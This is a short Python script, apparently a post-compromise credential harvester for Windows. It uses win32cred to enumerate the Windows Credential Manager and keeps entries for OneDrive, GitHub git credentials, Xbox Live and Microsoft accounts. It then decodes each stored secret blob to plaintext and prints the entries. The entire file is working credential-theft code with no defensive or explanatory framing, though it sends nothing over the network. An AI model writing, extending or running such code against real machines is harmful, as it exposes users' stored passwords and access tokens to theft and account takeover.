import win32cred



def cred_enum():
    targets = ["OneDrive Cached Credential", 'git:https://github.com', "XboxLive", "MicrosoftAccount:user="]

    credentials = win32cred.CredEnumerate(None, 0)
    results = ""

    for credential in credentials:
        for target in targets:
            if target in credential["TargetName"]:
                try:
                    target_name = credential["TargetName"]
                    cred_blob = credential["CredentialBlob"].decode("utf-8")
                    results += f"Target: {target_name} UTF8-Credential-Blob: {cred_blob}\n"
                except:
                    continue
    return results

def main():
    results = cred_enum()
    print(results)

if __name__=='__main__':
    main()